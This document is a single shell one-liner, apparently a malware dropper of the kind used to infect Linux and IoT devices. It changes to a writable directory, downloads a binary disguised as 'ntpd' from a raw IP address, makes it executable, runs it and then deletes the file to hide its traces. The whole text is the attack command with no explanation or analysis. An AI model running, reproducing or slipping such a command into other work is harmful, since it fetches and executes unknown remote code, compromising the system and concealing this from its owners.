cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.38.239/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
